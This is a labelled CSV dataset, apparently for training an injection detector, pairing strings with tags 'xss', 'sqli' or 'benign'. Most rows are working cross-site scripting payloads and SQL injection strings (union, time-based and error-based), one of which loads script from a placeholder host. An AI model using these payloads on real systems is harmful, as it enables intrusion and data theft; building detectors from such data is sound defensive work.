payload,type
<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>,xss
uni/**/on sel/**/ect,sqli
5.22E+15,benign
"<style>@keyframes slidein {}</style><b style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></b>",xss
<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>,xss
7.93E+15,benign
"1%""  )   and   (  3020  =  3020  )  *6703 and   (  ""%""  =  """,sqli
-9950' or 4425  =  1975,sqli
hi' or 1=1 --,sqli
"<style>@keyframes slidein {}</style><base style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></base>",xss
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
"1'||  (  select 'jpso' from dual where 9357  =  9357 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'",sqli
"<ul draggable=""true"" ondragend=""alert(1)"">test</ul>",xss
almendros,benign
"<source onmouseleave=""alert(1)"">test</source>",xss
',sqli
<BODY ONLOAD=alert('XSS')>,xss
"<ruby onclick=""alert(1)"">test</ruby>",xss
"-8614'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
<frame id=x tabindex=1 onactivate=alert(1)></frame>,xss
"<svg><script xlink:href=data:,alert(1) /> ",xss
",NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli
charlot@ringringrent.rw,benign
"calle pea 49, 9?b",benign
"<title ondblclick=""alert(1)"">test</title>",xss
""" or """"-""",sqli
"1""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""rrbl""  =  ""rrbl",sqli
"<style>@keyframes slidein {}</style><div style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></div>",xss
a3ui11d,benign
"ondulada, 121",benign
e72i4,benign
"<div draggable=""true"" contenteditable>drag me</div><li ondragover=alert(1) contenteditable>drop here</li>",xss
linton,benign
"<style>@keyframes x{}</style><blink style=""animation-name:x"" onanimationend=""alert(1)""></blink>",xss
1pa5364e3a,benign
"c/ corua, 25, 3h",benign
"<span onmousemove=""alert(1)"">test</span>",xss
"c/ san miguel, 111 6?f",benign
"<time onclick=""alert(1)"">test</time>",xss
10300,benign
5198,benign
"<dfn onclick=""alert(1)"">test</dfn>",xss
sisante,benign
"1%'   )    )     )   union all select null,null,null,null,null,null#",sqli
"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli
"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",sqli
"-9531'   )    )     )   union all select 4076,4076#",sqli
"<element onmousemove=""alert(1)"">test</element>",xss
"',(select%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))/*",sqli
<aside id=x tabindex=1 onfocus=alert(1)></aside>,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",xss
<form id=x tabindex=1 onactivate=alert(1)></form>,xss
"<strong oncontextmenu=""alert(1)"">test</strong>",xss
select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,sqli
"<tr onmouseup=""alert(1)"">test</tr>",xss
ramblizo,benign
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",xss
"<br onbeforecut=""alert(1)"" contenteditable>test</br>",xss
cos6rio,benign
maximinio,benign
"<style>@keyframes x{}</style><dd style=""animation-name:x"" onanimationend=""alert(1)""></dd>",xss
"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",sqli
"<ins onmouseup=""alert(1)"">test</ins>",xss
"<progress oncopy=""alert(1)"" contenteditable>test</progress>",xss
"<q onkeydown=""alert(1)"" contenteditable>test</q>",xss
"<select onkeyup=""alert(1)"" contenteditable>test</select>",xss
" select * from users where id  =  1 or 1#""@ union select version  (    )  ,version  (    )   -- 1",sqli
1'   )    )    as jzoh where 6484  =  6484 and 7364  =  4233--,sqli
"<style>@keyframes x{}</style><aside style=""animation-name:x"" onanimationend=""alert(1)""></aside>",xss
11901410z,benign
"<details oncopy=""alert(1)"" contenteditable>test</details>",xss
 UNION ALL SELECT,sqli
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",xss
select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,sqli
9.36E+14,benign
&,sqli
srinivas,benign
badajoz,benign
"<thead draggable=""true"" ondragleave=""alert(1)"">test</thead>",xss
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#",sqli
"1""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""yrgy"" like ""yrgy",sqli
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,sqli
"<style>@keyframes slidein {}</style><rtc style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rtc>",xss
 ORDER BY 30 ,sqli
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",xss
44392621e,benign
<tfoot onfocusout=alert(1) tabindex=1 id=x></tfoot><input autofocus>,xss
1 where 4844  =  4844,sqli
"1%""   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,sqli
pires arajol,benign
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",sqli
"<blink onclick=""alert(1)"">test</blink>",xss
"<tr ondblclick=""alert(1)"">test</tr>",xss
"<embed draggable=""true"" ondragend=""alert(1)"">test</embed>",xss
"<progress onmousedown=""alert(1)"">test</progress>",xss
"<div draggable=""true"" contenteditable>drag me</div><big ondragover=alert(1) contenteditable>drop here</big>",xss
1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,sqli
"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",sqli
"<svg onpaste=""alert(1)"" contenteditable>test</svg>",xss
1'+  (  select twyt where 3376  =  3376 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',sqli
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",sqli
"-8924   )    )    as jybr where 7901  =  7901 or elt  (  1032  =  1032,3623  )  --",sqli
"<div draggable=""true"" contenteditable>drag me</div><colgroup ondrop=alert(1) contenteditable>drop here</colgroup>",xss
"<style>:target {transform: rotate(180deg);}</style><ins id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></ins>",xss
61tico,benign
 )   or sleep  (  __TIME__  )    =  ',sqli
"</svg>//[""'`-->]]>]</div>",xss
"<style>@keyframes x{}</style><datalist style=""animation-name:x"" onanimationend=""alert(1)""></datalist>",xss
"<style>:target {color:red;}</style><tt id=x style=""transition:color 1s"" ontransitionend=alert(1)></tt>",xss
"<input onbeforecopy=alert(1) value=""XSS"" autofocus>",xss
"<element onmouseleave=""alert(1)"">test</element>",xss
5.98E+15,benign
 or pg_sleep(__TIME__)--,sqli
select * from users where id  =  1 +$+ or 1  =  1 -- 1,sqli
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",xss
1'||  (  select 'pmpd' where 9803  =  9803,sqli
<font onblur=alert(1) tabindex=1 id=x></font><input autofocus>,xss
chao-pin2,benign
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></title>",xss
enga3ladu4a,benign
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",xss
4.89E+15,benign
"<style>:target {color: red;}</style><frameset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></frameset>",xss
abagail,benign
"<style>:target {color: red;}</style><picture id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></picture>",xss
lnguida/longida,benign
barnett@micaelagriga.mw,benign
"<hr draggable=""true"" ondragend=""alert(1)"">test</hr>",xss
|,sqli
-3088' or 6872  =  6872 and 'miwk'  =  'miwk,sqli
nicforo,benign
"<iframe src=""http://www.example.org/dropHere.html""></iframe>//[""'`-->]]>]</div>",xss
"<head onclick=""alert(1)"">test</head>",xss
pineda de la sierra,benign
manda,benign
"<strike ondblclick=""alert(1)"">test</strike>",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></thead>",xss
1 and 5934  =  7745,sqli
"<frameset onkeydown=""alert(1)"" contenteditable>test</frameset>",xss
"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>",xss
"do cotaredo, 147 9e",benign
"-1171' union all select 3958,3958,3958,3958,3958--",sqli
9140,benign
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'bxjo' like 'bxjo",sqli
ocallaghan@asyra.li,benign
"<tfoot onkeypress=""alert(1)"" contenteditable>test</tfoot>",xss
"<style>:target {color:red;}</style><param id=x style=""transition:color 1s"" ontransitionend=alert(1)></param>",xss
lenya@fbi-criminal-network.com.mil,benign
"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",sqli
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,xss
6660,benign
 UNION ALL SELECT NULL-- ,sqli
"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""pfea""  =  ""pfea",sqli
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",sqli
<body onpageshow=alert(1)>,xss
"1%'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
"<sub oncut=""alert(1)"" contenteditable>test</sub>",xss
<source id=x tabindex=1 onfocusin=alert(1)></source>,xss
"<aside ondblclick=""alert(1)"">test</aside>",xss
select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,sqli
<svg><thead onload=alert(1)></thead>,xss
inca,benign
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></select>",xss
dax-branson@indianabilljaen.kp,benign
1  )   as nsdy where 7513  =  7513,sqli
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",sqli
"<div draggable=""true"" contenteditable>drag me</div><image ondragover=alert(1) contenteditable>drop here</image>",xss
1   )    )    as quap where 7625  =  7625,sqli
duffield@telelujo.coop,benign
"<img oncopy=""alert(1)"" contenteditable>test</img>",xss
"<th onmouseover=""alert(1)"">test</th>",xss
4.86E+15,benign
waitfor delay '0:0:5' and    (    (   'nvqf'  =  'nvqf,sqli
"<a onkeypress=""alert(1)"" contenteditable>test</a>",xss
"1   )    )     )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
reele.cto,benign
"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",sqli
warwicke@discon.mm,benign
34347,benign
"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>",xss
<ul id=x tabindex=1 onfocus=alert(1)></ul>,xss
regidor fa,benign
1'||  (  select 'etvo' from dual where 1557  =  1557,sqli
"<style>:target {color:red;}</style><multicol id=x style=""transition:color 1s"" ontransitionend=alert(1)></multicol>",xss
de tena leguizamn,benign
siefert,benign
"waitfor delay '0:0:5' and    (    (     (  ""mfro"" like ""mfro",sqli
"1%' union all select null,null,null,null,null,null,null--",sqli
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",sqli
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></fieldset>",xss
"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",sqli
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""xmvr""  =  ""xmvr",sqli
"1'   )    )    as hrra where 9533  =  9533 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
"<font onkeyup=""alert(1)"" contenteditable>test</font>",xss
14970,benign
3.89E+15,benign
' or ''=',sqli
"-2226%""   )    )    union all select 1018,1018,1018,1018--",sqli
<? echo('<SCR)';,xss
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,xss
"<q oncontextmenu=""alert(1)"">test</q>",xss
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>,xss
"<style>:target {color: red;}</style><slot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></slot>",xss
"<dialog oncopy=""alert(1)"" contenteditable>test</dialog>",xss
4.09E+15,benign
"<span onmouseout=""alert(1)"">test</span>",xss
3.19E+15,benign
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>,xss
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'guxv'  =  'guxv,sqli
"<div id=""28"">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//[""'`-->]]>]</div>",xss
"<style>@keyframes slidein {}</style><em style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></em>",xss
"1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",sqli
"<! foo=""><script>alert(91)</script>"">",xss
hofmeist0,benign
33825,benign
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",sqli
"1%""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""%""  =  """,sqli
-3881   )    )     )   union all select 4438--,sqli
"<style>:target {color:red;}</style><plaintext id=x style=""transition:color 1s"" ontransitionend=alert(1)></plaintext>",xss
"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'xngr'  =  'xngr",sqli
' or '1'='1'--,sqli
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></hr>",xss
aleandro-hayman@tecnoindomo.nr,benign
"<rt draggable=""true"" ondrag=""alert(1)"">test</rt>",xss
"<figure draggable=""true"" ondragstart=""alert(1)"">test</figure>",xss
50136,benign
or sleep  (  __TIME__  )  #,sqli
<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>,xss
1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,sqli
"<header draggable=""true"" ondrag=""alert(1)"">test</header>",xss
monteys bold,benign
escocia 197,benign
"<datalist oncopy=""alert(1)"" contenteditable>test</datalist>",xss
"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",sqli
<area id=x tabindex=1 onactivate=alert(1)></area>,xss
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",xss
capers@innovaris.fr,benign
"1%""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""%""  =  """,sqli
2.28E+15,benign
admin'  )   or   (  '1'  =  '1,sqli
"calle joan salvat papasseit s/n,",benign
"<template onkeydown=""alert(1)"" contenteditable>test</template>",xss
"1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
 ( ,sqli
carrer puigmercadal 33 5h,benign
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,sqli
cabarrs zafn,benign
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",sqli
"<th draggable=""true"" ondragleave=""alert(1)"">test</th>",xss
"<body onresize=""alert(1)"">",xss
" select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",sqli
7728,benign
"<html onbeforecopy=""alert(1)"" contenteditable>test</html>",xss
"<style draggable=""true"" ondragenter=""alert(1)"">test</style>",xss
"',NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*",sqli
"""onclick=prompt(8)>""@x.y",xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",xss
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,sqli
"1""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""ozvp""  =  ""ozvp",sqli
"1  )   union all select null,null,null,null#",sqli
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",sqli
"<style>:target {color: red;}</style><menuitem id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></menuitem>",xss
9.71E+15,benign
"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",sqli
"<u onkeyup=""alert(1)"" contenteditable>test</u>",xss
toba,benign
"<em draggable=""true"" ondrag=""alert(1)"">test</em>",xss
humanitari9mo,benign
"1""  )   as evoq where 8193  =  8193 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
 (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1931  =  1931  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,sqli
<img/src/onerror=prompt(8)>,xss
"1   )    )    as cbdx where 8998  =  8998 and elt  (  4249  =  4249,7259  )  --",sqli
' or 3=3 --,sqli
tenuta,benign
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",sqli
"<center onmousedown=""alert(1)"">test</center>",xss
"<strike onmousemove=""alert(1)"">test</strike>",xss
71404358f,benign
c/ oblit 76,benign
"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",sqli
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'nkte'  =  'nkte",sqli
select pg_sleep  (  5  )   and 'rpka'  =  'rpka,sqli
" select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",sqli
"<style>:target {color:red;}</style><article id=x style=""transition:color 1s"" ontransitionend=alert(1)></article>",xss
"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'jjxn'  =  'jjxn",sqli
"<style>:target {transform: rotate(180deg);}</style><multicol id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></multicol>",xss
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",sqli
"<input ondblclick=""alert(1)"">test</input>",xss
"<image draggable=""true"" ondragleave=""alert(1)"">test</image>",xss
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
"<blink onmouseover=""alert(1)"">test</blink>",xss
select * from users where id  =  '1' <@&@ or 1  =  1 -- 1',sqli
"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E",xss
x' or 1=1 or 'x'='y,sqli
pijahumeda,benign
1'+  (  select 'dpun' where 4760  =  4760,sqli
"-4305   )    )     )   union all select 2401,2401--",sqli
jellison@acch-portugal.uk,benign
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",xss
1%' and 4595  =  4595#,sqli
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- ",sqli
gilda6@mytanga.om,benign
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationstart=""alert(1)""></content>",xss
blascosancho,benign
1 where 1299  =  1299,sqli
7.21E+15,benign
"admin"" or ""1""  =  ""1""/*",sqli
"1""  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""bmbg"" like ""bmbg",sqli
weinberger@privatebanking.com.nz,benign
piggott@firstchoicecoffee.gq,benign
"<a class=bar href=""http://www.example.org"">www.example.org</a>",xss
mndez testua,benign
847,benign
<select autofocus onfocusin=alert(1)>,xss
"-4394'   )    )    union all select 3409,3409--",sqli
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- ",sqli
<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,xss
sqlvuln,sqli
tarp@redstarz.asia,benign
8912,benign
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",sqli
"<style>:target {transform: rotate(180deg);}</style><input id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></input>",xss
4.95E+15,benign
1120,benign
1'  )   and   (  1471  =  7892  )  *7892 and   (  'kkok' like 'kkok,sqli
<textarea onauxclick=alert(1)>XSS</textarea>,xss
protoalbitar,benign
"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",xss
urko,benign
"<spacer onbeforecut=""alert(1)"" contenteditable>test</spacer>",xss
"sierra bermeja s/n,",benign
1'||  (  select 'zyvk' from dual where 2072  =  2072,sqli
"a"" or 1=1--",sqli
"1' in boolean mode  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli
"<style>@keyframes x{}</style><wbr style=""animation-name:x"" onanimationstart=""alert(1)""></wbr>",xss
"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",sqli
6424,benign
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>,xss
"1 where 8114  =  8114 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
ojinaga bascn,benign
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi",sqli
"<style>@keyframes x{}</style><figure style=""animation-name:x"" onanimationstart=""alert(1)""></figure>",xss
"<div draggable=""true"" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>",xss
1%'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  '%'  =  ',sqli
"<style>:target {color:red;}</style><frameset id=x style=""transition:color 1s"" ontransitionend=alert(1)></frameset>",xss
" UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25",sqli
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   '%'  =  '",sqli
6.17E+15,benign
"<style>:target {color: red;}</style><basefont id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></basefont>",xss
"<address onkeydown=""alert(1)"" contenteditable>test</address>",xss
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>,xss
-9264'  )   or 8571  =  8571--,sqli
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",sqli
"<plaintext onmouseover=""alert(1)"">test</plaintext>",xss
